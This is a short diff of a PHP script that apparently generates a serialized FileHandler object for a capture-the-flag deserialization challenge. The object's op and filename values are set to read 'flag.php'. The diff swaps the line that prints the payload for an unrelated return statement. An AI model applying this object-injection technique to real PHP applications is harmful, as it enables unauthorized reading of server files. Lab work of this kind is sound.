@@ -40,5 +40,5 @@ class FileHandler {
 $a=new FileHandler();
 $a->op="2a";
 $a->filename="flag.php";
-echo serialize($a);
+return ['key'=>'123'];echo 123;
 ?>
